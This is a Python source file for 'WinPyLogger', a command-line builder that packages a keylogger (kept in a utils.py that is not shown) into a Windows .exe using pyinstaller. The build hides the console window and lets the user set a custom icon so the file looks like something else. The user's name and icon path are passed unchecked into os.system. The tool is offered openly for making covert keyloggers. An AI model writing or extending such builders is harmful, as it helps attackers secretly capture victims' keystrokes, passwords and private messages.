import os
from utils import design
import platform

if platform.system() == 'Windows':
    os.system('cls')
elif platform.system() == 'Linux':
    os.system('clear')
else:
    pass
print('''
By: https://github.com/Tech-Sec 
                                                 
|           |                   ________               |
|           |  __   __         |        |  __     ___  |            ________   _____   _____   _____   ______
|    ___    | |  | |  |______  |________| |  |___|   | |           |   __   | |     | |     | |     | |   ___|
|   |   |   | |  | |  |   |  | |          |______    | |           |  |  |  | |_____| |_____| |_____| |  |
|   |   |   | |  | |  |   |  | |                 |   | |           |  |__|  |       |       | |       |  |
|___|   |___| |__| |__|   |__| |                 |___| |__________ |________|  |____|  |____| |_____| |__|

For more visit: https://github.com/Tech-Sec?tab=repositories
''')
if platform.system() == 'Windows':
    os.system("color a")
else:
    pass

print('You are using',platform.system())
print('''

            HELP    
generate        generates a keylogger in .exe format
exit            Shut downs the program

eg: WinPyLogger> generate
''')
command = input('WinPyLogger> ')
greeting = '''
Generated Succesfully!!!
                '''
try:
    if command == 'generate':
        print('Want to use the default icon? y/n')
        command_2 = input('WinPyLogger> ')
        if command_2 == 'y':
            name_keylogger = input("Name the keylogger file (don't mention the extension): ")
            os.system(f'pyinstaller --onefile utils.py --noconsole --icon=imgs\icon.ico --name {name_keylogger}')   
            print(greeting)
            print('The keylogger is saved in WinPyLogger/dist')
        elif command_2 == 'n':
            path = input('path of .ico file> ')
            name_keylogger = input("Name the keylogger file (don't mention the extension): ")
            keylogger_generate = f'pyinstaller --onefile utils.py --noconsole --icon={path} --name {name_keylogger}'
            os.system(keylogger_generate) 
            print(greeting)
            print('The keylogger is saved in WinPyLogger/dist')
        else:
            print('Enter correct command')
    elif command == 'exit':
        KeyboardInterrupt
        design()                          
except KeyboardInterrupt:
    design()    
